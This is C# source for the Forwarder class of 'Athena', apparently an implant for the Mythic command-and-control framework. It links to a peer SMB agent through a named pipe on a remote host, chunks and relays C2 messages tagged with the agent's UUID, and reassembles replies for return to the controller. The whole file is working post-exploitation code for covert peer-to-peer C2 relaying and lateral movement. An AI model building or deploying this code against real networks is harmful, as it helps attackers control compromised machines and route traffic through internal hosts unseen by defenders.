﻿using Athena.Models.Mythic.Response;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using H.Pipes;
using H.Pipes.Args;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Athena
{
    public class Forwarder
    {
        public bool connected { get; set; }
        public ConcurrentBag<DelegateMessage> messageOut { get; set; }
        private PipeClient<DelegateMessage> clientPipe { get; set; }
        private object _lock = new object();
        private ConcurrentDictionary<string, string> partialMessages = new ConcurrentDictionary<string, string>();

        public Forwarder()
        {
            this.messageOut = new ConcurrentBag<DelegateMessage>();
        }

        public async Task<List<DelegateMessage>> GetMessages()
        {
            List<DelegateMessage> messagesOut;
            lock (_lock)
            {
                messagesOut = new List<DelegateMessage>(this.messageOut);
                this.messageOut.Clear();
            }

            return messagesOut;
        }

        //Link to the Athena SMB Agent
        public async Task<bool> Link(MythicJob job)
        {
            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);

            try
            {
                if (this.clientPipe is null || !this.connected)
                {
                    this.clientPipe = new PipeClient<DelegateMessage>(par["pipename"], par["hostname"]);
                    this.clientPipe.MessageReceived += (o, args) => OnMessageReceive(args);
                    //this.clientPipe.ExceptionOccurred += (o, args) => Console.WriteLine("Exception: " + args.Exception.Message);
                    this.clientPipe.Connected += (o, args) => this.connected = true;
                    this.clientPipe.Disconnected += (o, args) => this.connected = false;
                    await clientPipe.ConnectAsync();

                    if (clientPipe.IsConnected)
                    {
                        this.connected = true;
                        return true;
                    }
                    else { return false; }
                }
                else { return false; }
            }
            catch { return false; }
        }
        public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
        {
            try
            {
                IEnumerable<string> parts = dm.message.SplitByLength(50000);

                foreach (string part in parts)
                {
                    DelegateMessage msg;
                    if (part == parts.Last())
                    {
                        msg = new DelegateMessage()
                        {
                            uuid = MythicConfig.uuid,
                            message = part,
                            c2_profile = "smb",
                            final = true
                        };
                    }
                    else
                    {
                        msg = new DelegateMessage()
                        {
                            uuid = MythicConfig.uuid,
                            message = part,
                            c2_profile = "smb",
                            final = false
                        };
                    }
                    await this.clientPipe.WriteAsync(msg);
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
        private async Task DoSomethingWithMessage(DelegateMessage message)
        {

            if (Monitor.TryEnter(_lock, 5000))
            {
                this.messageOut.Add(message);
                Monitor.Exit(_lock);
            }
        }
        //Unlink from the named pipe
        public async Task<bool> Unlink()
        {
            try
            {
                await this.clientPipe.DisconnectAsync();
                this.connected = false;
                await this.clientPipe.DisposeAsync();
                this.partialMessages.Clear();
                return true;
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return false;
            }
        }
        private async Task OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
        {
            try
            {
                //Add message to out queue.
                // DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(args.Message);

                if (this.partialMessages.ContainsKey(args.Message.uuid))
                {
                    if (args.Message.final)
                    {
                        string curMessage = args.Message.message;

                        args.Message.message = this.partialMessages[args.Message.uuid] + curMessage;

                        await this.DoSomethingWithMessage(args.Message);
                        this.partialMessages.Remove(args.Message.uuid, out _);

                    }
                    else //Not Last Message but we already have a value in the partial messages
                    {
                        this.partialMessages[args.Message.uuid] += args.Message.message;
                    }
                }
                else //First time we've seen this message
                {
                    if (args.Message.final)
                    {
                        await this.DoSomethingWithMessage(args.Message);
                    }
                    else
                    {
                        this.partialMessages.GetOrAdd(args.Message.uuid, args.Message.message); //Add value to our Collection
                    }
                }
            }
            catch (Exception e)
            {
            }
        }
    }
}
